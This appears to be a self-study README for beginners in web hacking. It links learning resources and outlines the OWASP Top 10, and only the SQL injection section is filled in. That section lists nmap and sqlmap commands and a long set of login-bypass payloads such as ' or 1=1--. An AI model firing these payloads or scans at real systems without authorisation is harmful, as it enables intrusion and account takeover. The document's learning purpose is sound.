# Hacking Guide For Script Kiddies  

>
![Ricard Feynman](https://yahooeysblog.files.wordpress.com/2015/06/richard-feynman-curiosity.jpg)
>

## What is it?

>
>This is my study plan for going from zero knowledge (self-taught) to be an Omniscient.
>
![I don't know what I'm supposed to do](https://i.pinimg.com/originals/6e/3b/9d/6e3b9d51461add09fd38c50f43ab7f2c.gif)
>
> Created this as a cheat sheat for any script kiddies to study any topics
---

## Table of Contents

### 1st Year (2020)

- [What is it?](#what-is-it)
- [Why use it?](#why-use-it)
- [How to use it?](#how-to-use-it)
- [Everything you need to know about Programming](#everything-you-need-to-know-about-programming)
- [Hack like a Pro](#hack-like-a-pro)

### 2nd Year (2021)

- [OWASP](#owasp)
  - [Injection](#injection)
  - [Broken Authentication](#broken-authentication)
  - [Sensitive Data Exposure](#sensitive-data-exposure)
  - [XML External Entity](#xml-external-entity)
  - [Broken Access Control](#broken-access-control)
  - [Security Misconfiguration](#security-misconfiguration)
  - [Cross-site Scripting](#cross-site-scripting)
  - [Insecure Deserialization](#insecure-deserialization)
  - [Components with Known Vulnerabilities](#components-with-known-vulnerabilities)
  - [Insufficent Logging & Monitoring](#insufficent-logging-and-monitoring)

# 1st Year

## Why use it?

When I started this project, I didn't know about absolutely anything, didn't know Coding or even Hacking.

![Absolutely Nothing](http://www.quickmeme.com/img/1c/1c83e1c0388b35d43f2401543c9e214fb31892cec0d3966c7fe11955b5efe18f.jpg)

It's a long plan. It may take years. If you are familiar with a lot of this already it will take you a lot less time.

## How to use it?

Open any repositories that you interested and *read* it, It's already have guide on how to tackle the topics.

## Everything you need to know about Programming

- [ ] [Repo related to programming](https://github.com/g3nj1z/everything-you-need-to-know-about-programming)

## Hack like a Pro

- [ ] [Repo related to hacking](https://github.com/g3nj1z/hack-like-a-pro)

# 2nd Year
After a year of exploring in IT security. I have become lazy to copy and paste. Instead, I'll put the links that will help to go through the related topics.

## OWASP

### Injection

[SQL INJECTION - PORTSWINGER](https://portswigger.net/web-security/sql-injection)

- Enum using nmap
  >
  > nmap -sV --script=http-sql-injection <target>
  >
- Using jsql
- Using sqlmap with login-page
- Capture the request using burp suite, and save the request in a file.
  >
  > sqlmap -r request.txt
  >
- Crawl a page to find sql-injection.
  >
  > sqlmap -u http://example.com --crawl=1
  >
- Login bypass
  >
  > ‘or 1=1- -
  >
  >‘ or ‘1’=1
  >
  >‘ or ‘1’=1 - -
  >
  >‘–
  >
  >' or '1'='1
  >
  >-'
  >
  >' '
  >
  >'&'
  >
  >'^'
  >
  >'*'
  >
  >' or ''-'
  >
  >' or '' '
  >
  >' or ''&'
  >
  >' or ''^'`
  >
  >`’ or ‘‘*’
  >
  >"-"
  >
  >" "
  >
  >"&"
  >
  >"^"
  >
  >"*"
  >
  >" or ""-"
  >
  >" or "" "
  >
  >" or ""&"
  >
  >" or ""^"
  >
  >" or ""*"
  >
  >or true--
  >
  >" or true--
  >
  >' or true--
  >
  >") or true--
  >
  >') or true--
  >
  >' or 'x'='x
  >
  >') or ('x')=('x
  >
  >')) or (('x'))=(('x
  >
  >" or "x"="x
  >
  >") or ("x")=("x
  >
  >")) or (("x"))=(("x
  >
- known Username
  >
  >admin’ - -
  >
  >admin’) - -
  >
- Using error-bases DB enumeration
  >
  >Add the tick '
  >
  >Enumerate columns
  >
Using order by
  [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html)

### Broken Authentication

### Sensitive Data Exposure

### XML External Entity

### Broken Access Control

### Security Misconfiguration

### Cross-site Scripting

### Insecure Deserialization

### Components with Known Vulnerabilities

### Insufficent Logging & Monitoring
